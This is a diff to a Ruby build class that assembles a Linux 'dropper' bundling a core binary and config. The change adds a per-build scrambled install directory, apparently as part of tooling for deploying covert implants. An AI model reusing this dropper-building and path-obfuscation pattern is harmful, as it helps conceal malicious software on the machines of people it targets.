@@ -44,8 +44,14 @@ class BuildLinux < Build
 
     dropper_size = File.size(path('dropper'))
 
+    # calculate the install dir for this factory
+    core = scramble_name(@factory.seed, 3)
+    scramble_dir = scramble_name(core[0..7], 7)
+
+    # create the dropper
     File.open(path('dropper'), "ab") do |f|
       f.write DROPPER_MARKER
+      f.write scramble_dir
       f.write [File.size(path('core'))].pack('I')
       f.write File.binread(path('core'))
       f.write [File.size(path('config'))].pack('I')
